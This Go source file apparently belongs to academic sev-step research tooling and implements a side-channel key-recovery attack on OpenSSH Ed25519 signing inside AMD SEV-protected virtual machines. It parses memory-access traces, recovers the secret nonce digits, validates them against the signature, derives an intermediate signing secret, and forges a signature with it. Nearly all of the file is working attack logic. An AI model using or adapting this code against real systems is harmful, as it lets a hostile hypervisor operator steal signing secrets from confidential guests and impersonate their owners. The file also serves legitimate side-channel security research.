package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"pfFingerprint"
	"pfFingerprint/cmd/pfOSSHRecoverEdDSAKey/osshEDDSA"
	"sort"

	"golang.org/x/crypto/ed25519"

	"github.com/UzL-ITS/sev-step/sevStep"
)

type PrivKeyDbgData struct {
	correctB  []int8
	edPrivKey *ed25519.PrivateKey
}

func main() {

	configIn := flag.String("configIn", "attack-config.json", "Path to config file")
	in := flag.String("in", "attack-trace.txt", "Path to trace file")
	specificOffset := flag.Uint("specificOffset", 0, "If set, only that offset is considered for key recovery")
	debugLog := flag.Bool("debugLog", false, "Enable additional prints for debugging")
	debugCheckMemValues := flag.Bool("debugCheckMemValues", false, "Checks if the captured memory pages fulfill some marker value pattern. Requires plaintext memory snapshots")
	debugPrivateKeyPath := flag.String("debugPrivateKeyPath", "", "Loads private key to calculate correct swap sequence")
	flag.Parse()

	//
	//handles flags
	//

	rawConfig, err := ioutil.ReadFile(*configIn)
	if err != nil {
		log.Printf("failed to read config file : %v", err)
		return
	}
	attackConfig := &pfFingerprint.OSSHAttackConfigEdDSA{}
	if err := json.Unmarshal(rawConfig, attackConfig); err != nil {
		log.Printf("failed to parse config file : %v", err)
		return
	}

	log.Printf("Signature Type : %v\n", attackConfig.SigMsg.SignatureType)
	log.Printf("Attack Config: ChooseT %x, Fe64GPA %x, StackGPA %x\n", attackConfig.ChooseTGPA, attackConfig.Fe64GPA, attackConfig.StackBufGPA)

	inFile, err := os.Open(*in)
	if err != nil {
		log.Printf("failed to open input file :%v\n", err)
		return
	}
	defer func() {
		if err := inFile.Close(); err != nil {
			log.Printf("Failed to close input file : %v", err)
		}
	}()
	inReader := bufio.NewReader(inFile)

	events, err := sevStep.ParseInputFile(inReader)
	if err != nil {
		log.Printf("failed to parse input file %v", err)
		return
	}

	//
	// main logic
	//

	fmt.Printf("Got %v events\n", len(events))

	//discard events without memory read
	newLen := 0
	for _, v := range events {
		if v.MonitorGPA != 0 {
			events[newLen] = v
			newLen++
		}
	}
	events = events[:newLen]

	fmt.Printf("Events with mem acceses: %v\n", len(events))

	//
	//determine 16 aligned memory blocks in monitored page that change
	//Each location gives is candidate for the buffer that we want to observe
	//
	offsetsWithChange := getStackBufCandidates(attackConfig, events)

	if *specificOffset != 0 {
		log.Printf("Restricting search to offset %03x\n", *specificOffset)
		offsetsWithChange = map[int]bool{int(*specificOffset): true}
	}

	if *debugLog {
		tmp := make([]int, 0, len(offsetsWithChange))
		for k, ok := range offsetsWithChange {
			if ok {
				tmp = append(tmp, k)
			}
			sort.Slice(tmp, func(i, j int) bool {
				return tmp[i] < tmp[j]
			})
		}
		log.Printf("Offsets with change: %03x\n", tmp)
	}

	if *specificOffset != 0 {
		var beforeSwap []byte
		var eventOffset int
		log.Printf("Printing values for offset")
		for cycleIDX := 0; cycleIDX < attackConfig.MainLoopCycles; cycleIDX++ {
			eventOffset = cycleIDX * attackConfig.MemAccessesPerCycle
			for cycleRelEventIDX := 0; cycleRelEventIDX < attackConfig.MemAccessesPerCycle-1; cycleRelEventIDX++ {
				beforeSwap = events[eventOffset+cycleRelEventIDX].Content
				log.Printf("cycle %02v %x\n", cycleIDX, beforeSwap[*specificOffset:*specificOffset+uint(attackConfig.StackBufBytes)])

			}
		}
		log.Printf("\n\n\n")
	}

	//compare with known marker values to refine search for correct offset
	//only works in a debug scenario where the memory values are not encrypted
	//removes values from offsetsWithChange that do not match the marker values
	if *debugCheckMemValues {
		log.Printf("applying offset filter due to \"-debugCheckMemValues\" flag")
		matches, err := filterOffsetsViaPlaintext(attackConfig, &offsetsWithChange, events)
		if err != nil {
			log.Printf("filtering failed : %v", err)
			return
		}
		if matches == 0 {
			log.Printf("Did not find offsets matching the marker values\n")
			return
		}
		for offset, ok := range offsetsWithChange {
			if ok {
				log.Printf("Offset %03x matches all marker values", offset)
			}
		}

	}

	//only available if *debugPrivateKeyPath  is set
	var privKeyDbgData *PrivKeyDbgData
	havePrivKeyDbgData := false
	//debug scenario: use secret key to recompute correct b value
	if *debugPrivateKeyPath != "" {
		privKeyFile, err := os.Open(*debugPrivateKeyPath)
		if err != nil {
			log.Printf("Failed to open priv key file : %v", err)
			return
		}
		defer privKeyFile.Close()
		privKeyDbgData, err = calcPrivKeyDbgData(privKeyFile, attackConfig.SigMsg.Message)
		if err != nil {
			log.Printf("calcPrivKeyDbgData failed : %v", err)
			return
		}
		havePrivKeyDbgData = true
	}

	//recover signed b from key candidates
	offsetToRecoveredB := make(map[int][]int8)
	discardedOffsets := make([]int, 0)

	//recover "b" value and check result by comparing with "big R" from signature
	//save valid values in offsetToRecoveredB
	for offset, ok := range offsetsWithChange {
		if !ok {
			continue
		}
		recoveredB, ok := recoverSignedBFromSC(offset, events, attackConfig)
		if !ok {
			discardedOffsets = append(discardedOffsets, offset)
			continue
		}
		log.Printf("recovered signed b: %v\n", recoveredB)

		if havePrivKeyDbgData {
			bCorrect := true
			for i := 1; i < attackConfig.MainLoopCycles; i++ {
				if got, want := recoveredB[i], privKeyDbgData.correctB[i]; got != want {
					log.Printf("recovered b[%v] is %v but want %v", i, got, want)
					bCorrect = false
				}
			}
			if bCorrect {
				log.Printf("debug check, offset %03x: b is correct (◠﹏◠) (exlucding the missing first byte)", offset)
			}
		}

		sigR, _, err := parseSignature(attackConfig.SigMsg.Signature)
		if err != nil {
			log.Printf("failed to parse signature : %v", err)
			return
		}
		//we have no info for first cycle. bruteforce all possibilities
		//Compare candidate with big R from signature to check if guess was correct
		bIsCorrect := false
		candidatesUnknownFirstByte := []int8{1, -1, 2, -2, 3, -3, -4}
		for _, v := range candidatesUnknownFirstByte {
			recoveredB[0] = v
			recoveredR := osshEDDSA.RecoverBigRFromB(recoveredB)
			if got, want := len(recoveredR), 32; got != want {
				log.Printf("recovered R value has unepexted length %v, want %v", got, want)
			}
			if bytes.Equal(recoveredR, sigR) {
				bIsCorrect = true
				break
			}
		}
		if !bIsCorrect {
			discardedOffsets = append(discardedOffsets, offset)
			continue
		}
		offsetToRecoveredB[offset] = recoveredB
	}
	sort.Slice(discardedOffsets, func(i, j int) bool {
		return discardedOffsets[i] < discardedOffsets[j]
	})
	log.Printf("Discarded the following offsets, as they lead to a wrong b value: %03x\n", discardedOffsets)
	log.Printf("%v out of %v offsets lead to the recovery of the correct signed b value\n", len(offsetToRecoveredB), len(offsetsWithChange))

	//try to extract secret and create a forged signature
	for offset, signedB := range offsetToRecoveredB {
		_, sigS, err := parseSignature(attackConfig.SigMsg.Signature)
		if err != nil {
			log.Printf("failed to parse signature : %v", err)
			return
		}
		unsignedB := signedBToUnsigned(signedB)
		messageDigestReduced := unsignedBToMessageDigestReduced(unsignedB)

		log.Printf("Pubkey from ssh record : %x", attackConfig.SigMsg.PublicKeySSH)
		if havePrivKeyDbgData {
			log.Printf("Pubkey from secret key : %x", (*privKeyDbgData.edPrivKey)[32:])

		}
		intermediateSecret := recoverSecretFromSig(attackConfig.SigMsg.Message, messageDigestReduced[:], sigS, attackConfig.SigMsg.PublicKeySSH)
		msgForgedSig := []byte("test message")
		forgedSig, err := signWithIntermediateSecret(msgForgedSig, intermediateSecret, attackConfig.SigMsg.PublicKeySSH)
		if err != nil {
			log.Printf("Failed to create forged signature with data from offset %03x: %v", offset, err)
		}
		forgedSigValid := ed25519.Verify(attackConfig.SigMsg.PublicKeySSH, msgForgedSig, forgedSig)
		log.Printf("offset %03x: Forged signature valid? : %v\n", offset, forgedSigValid)
		if forgedSigValid {
			log.Printf("☜(⌒▽⌒)☞ ☜(⌒▽⌒)☞ ☜(⌒▽⌒)☞ ☜(⌒▽⌒)☞\n")
			log.Printf("Intermediate secret is %x\n", intermediateSecret)
			log.Printf("(note that this is not the private key, but sufficient to sign arbitrary messages)\n")
			log.Printf("Omitting other entries as we have found the secret")
			break
		} else {
			log.Printf("B was valid but signature not, this shoudl not happen")
		}
	}

}

func debugCheckBeforeValue(cycleIDX, offset int, pageContent []byte) (bool, error) {
	//indices are from choose_t implementation in openssl (ge25519.c)
	data := ge25519BaseMultiplesAffine[5*cycleIDX]

	//create buffer with values in 32bit little endian
	content := [][]uint32{data.x, data.y}
	littleEndCompareBuf := &bytes.Buffer{}
	for i := range content {
		for j := range content[i] {
			if err := binary.Write(littleEndCompareBuf, binary.LittleEndian, content[i][j]); err != nil {
				return false, err
			}
		}
	}

	if offset+littleEndCompareBuf.Len() > 4096 {
		return false, fmt.Errorf("offset + len are larger than page size")
	}
	buf := littleEndCompareBuf.Bytes()
	/*
		if cycleIDX > 0 {
			log.Printf("cycle %v offset %03x got %x\n", cycleIDX, offset, pageContent[offset:offset+len(buf)])
			log.Printf("                    want %x\n", buf)
		}*/

	for i, v := range buf {
		if pageContent[offset+i] != v {
			return false, nil
		}
	}
	return true, nil
}

func printPage(buf []byte) {
	fmt.Printf("\nBeginPage\n")
	var block []byte
	for i := 0; i < len(buf); i += 16 {
		block = buf[i : i+16]
		blockEmpty := true
		for j := range block {
			if block[j] != 0 {
				blockEmpty = false
				break
			}
		}
		if !blockEmpty {
			fmt.Printf("Offset %03x: %x\n", i, block)
		}
	}
	fmt.Printf("\nEndPage\n")

}
